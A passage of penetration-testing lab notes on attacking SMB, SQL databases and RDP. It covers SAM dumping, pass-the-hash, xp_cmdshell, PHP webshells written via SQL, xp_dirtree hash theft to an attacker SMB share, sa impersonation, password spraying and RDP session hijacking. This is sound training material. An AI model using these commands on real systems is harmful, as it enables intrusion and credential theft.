SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

#### Extract Hashes from SAM Database

The Security Account Manager (SAM) daabase can be pulled if we have admin creds. Those hashes can be used for:

-   Authenticate as another user.
-   Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
-   Pass The Hash. We will discuss it later in this section.

```shell-session
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

#### Pass-the-Hash (PtH)

```shell-session
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### Forced Authentication Attacks

We can create a fake SMB server to capture [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

# Latest SMB Vulnerabilities

One recent significant vulnerability that affected the SMB protocol was called [SMBGhost](https://awakesecurity.com/blog/smbghost-wormable-vulnerability-analysis-cve-2020-0796/) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796).

# Attacking SQL Databases

## Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

```shell-session
$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

## Authentication Mechanisms

MSSQL supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server):

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Authentication Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Windows authentication mode</code></td>
<td>This is the default, often referred to as <code>integrated</code> security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td>
</tr>
<tr>
<td><code>Mixed mode</code></td>
<td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td>
</tr>
</tbody>
</table>

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

### Misconfigurations

Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

-   Read or change the contents of a database
-   Read or change the server configuration
-   Execute commands
-   Read local files
-   Communicate with other databases
-   Capture the local system hash
-   Impersonate existing users
-   Gain access to other networks

In this section, we will explore some of these attacks.

## Protocol Specific Attacks



### MySQL - Connecting

```shell-session
$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

## Sqlcmd - Connecting to the SQL Server

```cmd-session
C:\> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

If we're targeting MSSQL from Linux, we can use sqsh.
```shell-session
$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

There's also impacket mssqlclient.py

```shell-session
$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell-session
$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

## SQL Default Databases

`MySQL` default system schemas/databases:

-   `mysql` - is the system database that contains tables that store information required by the MySQL server
-   `information_schema` - provides access to database metadata
-   `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
-   `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

-   `master` - keeps the information for an instance of SQL Server.
-   `msdb` - used by SQL Server Agent.
-   `model` - a template database copied for each new database.
-   `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
-   `tempdb` - keeps temporary objects for SQL queries.

## SQL Syntax

- `SHOW DATABASES`
- `USE <database>`
- `SHOW TABLES`
- `SELECT * FROM <database>`

## sqlcmd

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```



## Execute Commands

MSSQL has extended stored procedures called xp_cmdshell.

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

Code: mssql

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Write Local Files

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

-   If empty, the variable has no effect, which is not a secure setting.
-   If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
-   If set to NULL, the server disables import and export operations.

Below, it's not set, so we can read and write data using MySQL.

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```


To write with MSSQL we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

## MSSQL - Enable Ole Automation Procedures

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

## MSSQL - Create a File

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files

### Read Local Files in MSSQL
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

### Read Local Files in MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

## Capture MSSQL Service Hash

#### XP_DIRTREE Hash Stealing


```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Hash Stealing

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Don't forget to setup responder or smbserver.

## Impersonate Existing Users with MSSQL

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

#### Verifying our Current User and Role

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

#### Impersonating the SA User

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

#### Identify linked Servers in MSSQL

Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

# MSSQL Vulnerability

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>XP_DIRTREE</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>The source here is the user input, which specifies the function and the folder shared in the network.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The process should ensure that all contents of the specified folder are displayed to the user.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>The SMB service is used as the destination to which the specified information is forwarded.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>


<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Stealing the Hash</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>5.</code></td>
<td>Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>6.</code></td>
<td>The data is then processed, and the specified folder is queried for the contents.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>7.</code></td>
<td>The associated authentication hash is used accordingly since the MSSQL running user queries the service.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>8.</code></td>
<td>In this case, the destination for the authentication and query is the host we control and the shared folder on the network.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>


# Attacking RDP

[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.

```shell-session
# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.

```shell-session
# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

Be mindful of security policies that may lock us out. We should try Password Spraying.

```shell-session
# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

## Hydra -RDP Password Spraying

```shell-session
# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

## RDP Login

```shell-session
# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

## RDP Specific Attacks

### RDP Session Hijacking

If another user is connected via RDP we can try and hijack that remote session to escalate our privileges. We can see other users in task manager Users.  Or do `query user`

We need to have `SYSTEM` privileges and use [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.

```cmd-session
C:\> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```


```cmd-session
C:\> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"

[SC] CreateService SUCCESS

C:\> net start sessionhijack
```

### RDP Pass-the-Hash

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
![Pasted image 20230403183843.png](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAApcAAAEICAYAAAAKtN+aAAAABHNCSVQICAgIfAhkiAAAIABJREFUeF7t3V/IbledH/AnZS4S8F8CWpJcGIn0xBrMxTQGZ3RudFILNikMI0SYCDK2DrZaKNZ2hvSiMhZHhGorcVoQzIAXkYFJKtQ6nZsxjmimFxl0NMVgLJjQCSTjOJBcFOz5Pjm/N+td2Xs/f85+3+d99/lsOJzz7D/rz2etvfZvr72f81x14Z77f76yECBAgAABAgQIEJhB4O/MkIYkCBAgQIAAAQIECKwFBJc6AgECBAgQIECAwGwCgsvZKCVEgAABAgQIECAguNQHCBAgQIAAAQIEZhMQXM5GKSECBAgQIECAAAHBpT5AgAABAgQIECAwm4DgcjZKCREgQIAAAQIECAgu9QECBAgQIECAAIHZBASXs1FKiAABAgQIECBAQHCpDxAgQIAAAQIECMwmILicjVJCBAgQIECAAAECgkt9gAABAgQIECBAYDYBweVslBIiQIAAAQIECBAQXOoDBAgQIECAAAECswkILmejlBABAgQIECBAgIDgUh8gQIAAAQIECBCYTUBwORulhAgQIECAAAECBASX+gABAgQIECBAgMBsAoLL2SglRIAAAQIECBAgILjUBwgQIECAAAECBGYTEFzORikhAgQIECBAgAABwaU+QIAAAQIECBAgMJuA4HI2SgkRIECAAAECBAgILvUBAgQIECBAgACB2QQEl7NRSogAAQIECBAgQEBwqQ8QIECAAAECBAjMJiC4nI1SQgQIECBAgAABAoJLfYAAAQIECBAgQGA2AcHlbJQSIkCAAAECBAgQEFzqAwQIECBAgAABArMJCC5no5QQAQIECBAgQICA4FIfIECAAAECBAgQmE1AcDkbpYQIECBAgAABAgQEl/oAAQIECBAgQIDAbAKCy9koJUSAAAECBAgQICC41AcIECBAgAABAgRmExBczkYpIQIECBAgQIAAAcGlPkCAAAECBAgQIDCbgOByNkoJESBAgAABAgQICC71AQIECBAgQIAAgdkEBJezUUqIAAECBAgQIEBAcKkPECBAgAABAgQIzCYguJyNUkIECBAgQIAAAQKCS32AAAECBAgQIEBgNgHB5WyUEiJAgAABAgQIEBBc6gMECBAgQIAAAQKzCQguZ6OUEAECBAgQIECA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